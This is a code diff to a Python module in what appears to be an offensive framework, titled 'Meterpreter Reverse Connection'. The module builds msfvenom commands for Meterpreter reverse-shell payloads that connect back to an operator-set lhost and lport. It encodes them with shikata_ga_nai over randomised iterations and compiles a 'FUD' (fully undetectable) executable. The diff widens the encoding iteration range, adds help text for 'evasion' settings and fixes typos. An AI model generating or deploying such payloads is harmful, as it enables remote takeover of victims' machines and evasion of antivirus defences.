@@ -6,7 +6,12 @@ import os, random, importlib
 class Payload(controller.Module):
 	__info__ = {
 		'name': 'Meterpreter Reverse Connection',
-		'description' : 'edit here',
+		'description' : [
+			'Meterpreter Rerverse Shell generator',
+			":help' for help banner",
+			":show platforms' for advanced platform setting",
+			":show evasions' for advanced evasion technology setting"
+		],
 		'author': [
 			'Module: dmknght, dmknghtx2team@gmail.com',
 			'Technology: Diego Cornacchini, oddcod3@gmail.com'
@@ -35,7 +40,7 @@ class Payload(controller.Module):
 				},
 				'linux': 'msfvenom -p linux/{}/meterpreter/reverse_{} -a {} '.format(self.architecture, self.protocol, self.architecture)
 			}
-			randiter = str(random.randint(10, 15))
+			randiter = str(random.randint(7, 18))
 			generate = generate[self.platform][self.architecture] + 'lhost={} lport={} '.format(self.lhost, self.lport)
 			generate += '--smallest -e x86/shikata_ga_nai -f c -b "\\x00\\x0a\\x0d" -i {} '.format(randiter)
 			src_output = 'output/meterpreter_reverse.c'
@@ -58,6 +63,6 @@ class Payload(controller.Module):
 		except:
 			utils.printf("Error while generating FUD payload", 'bad')
 			return ''
-		utils.printf("Buidling executable file", 'warn')
+		utils.printf("Building executable file", 'warn')
 		actions.build_exec(self.platform, self.architecture, src_output, 'output/')
 		utils.printf("Build completed", 'good')
